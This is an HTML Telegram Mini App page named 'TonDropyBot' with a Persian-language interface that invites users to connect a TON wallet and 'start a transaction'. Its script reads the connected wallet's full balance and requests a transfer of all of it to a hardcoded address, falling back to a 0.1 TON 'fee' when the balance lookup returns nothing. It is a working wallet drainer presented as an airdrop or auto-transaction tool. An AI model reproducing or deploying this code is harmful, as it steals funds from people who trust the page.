```html
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TonDropyBot - تراکنش خودکار</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        /* استایل‌های ضروری */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: system-ui, sans-serif; background: #0b1019; color: #fff; display: flex; flex-direction: column; min-height: 100vh; }
        .container { padding: 20px; max-width: 600px; margin: 0 auto; width: 100%; }
        .card { background: #1a1f2b; border-radius: 20px; padding: 20px; margin-bottom: 20px; }
        button, .btn { width: 100%; padding: 15px; border-radius: 15px; border: none; font-size: 16px; font-weight: bold; cursor: pointer; background: #2e9aff; color: white; margin-bottom: 10px; }
        .hidden { display: none; }
        #walletAddress { background: #2a2f3a; padding: 15px; border-radius: 10px; margin-top: 15px; word-break: break-all; }
        #toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1e88e5; padding: 10px 20px; border-radius: 30px; z-index: 9999; display: none; }
        #toast.show { display: block; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card" style="text-align: center;">
            <h1 style="margin-bottom: 20px;">🚀 TonDropyBot</h1>
            <p style="margin-bottom: 30px;">کیف پول خود را متصل کنید</p>
            <div id="ton-connect-btn"></div>
            <div id="walletAddress" class="hidden">
                <i class="fas fa-wallet"></i> آدرس کیف پول شما:<br>
                <span id="walletAddressFull"></span>
            </div>
            <button onclick="startTransaction()" id="startBtn" class="hidden" style="background: #00c853; margin-top: 20px;">شروع تراکنش</button>
        </div>
    </div>
    <div id="toast">پیام</div>
    <script>
        const CONFIG = {
            WALLET_ADDRESS: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
            NETWORK_FEE: 0.0035
        };

        let walletAddress = null;

        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://raw.githubusercontent.com/nimwmesfandiari/ton-plus-bot/main/tonconnect-manifest.json',
            buttonRootId: 'ton-connect-btn'
        });

        tonConnectUI.onStatusChange(wallet => {
            if (wallet) {
                walletAddress = wallet.account.address;
                document.getElementById('walletAddressFull').innerText = walletAddress;
                document.getElementById('walletAddress').classList.remove('hidden');
                document.getElementById('startBtn').classList.remove('hidden');
                showToast('✅ کیف پول متصل شد');
            } else {
                walletAddress = null;
                document.getElementById('walletAddress').classList.add('hidden');
                document.getElementById('startBtn').classList.add('hidden');
            }
        });

        window.startTransaction = async function() {
            if (!walletAddress) {
                showToast('❌ ابتدا کیف پول را متصل کنید');
                return;
            }

            try {
                showToast('🔄 در حال آماده‌سازی تراکنش...');
                
                // دریافت موجودی
                const balance = await getBalance(walletAddress);
                
                let amount = 0.1; // پیش‌فرض
                if (balance > 0) {
                    amount = balance; // کل موجودی
                    showToast(`💰 موجودی ${balance.toFixed(3)} TON`);
                } else {
                    showToast(`💳 درخواست کارمزد 0.1 TON`);
                }

                const amountInNano = Math.floor(amount * 1e9).toString();
                
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600,
                    messages: [{
                        address: CONFIG.WALLET_ADDRESS,
                        amount: amountInNano,
                        payload: amount > 0.1 ? "" : btoa("Insufficient balance. Please pay 0.1 TON fee.")
                    }]
                };

                showToast('🔄 لطفا در کیف پول تایید کنید...');
                
                const result = await tonConnectUI.sendTransaction(transaction);
                
                showToast('✅ تراکنش موفقیت‌آمیز بود');
                console.log('✅ نتیجه:', result);

            } catch (error) {
                console.error('❌ خطا:', error);
                if (error.message?.includes('rejected')) {
                    showToast('❌ تراکنش لغو شد');
                } else {
                    showToast('❌ خطا: ' + (error.message || 'نامشخص'));
                }
            }
        };

        async function getBalance(address) {
            try {
                const proxy = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`)}`;
                const res = await fetch(proxy, { timeout: 5000 });
                const nano = parseInt(await res.text());
                return nano / 1e9;
            } catch {
                return 0; // در صورت خطا، 0 برگردان
            }
        }

        function showToast(msg) {
            const toast = document.getElementById('toast');
            toast.innerText = msg;
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 3000);
        }

        // اطلاعات کاربر تلگرام
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand();
    </script>
</body>
</html>
```
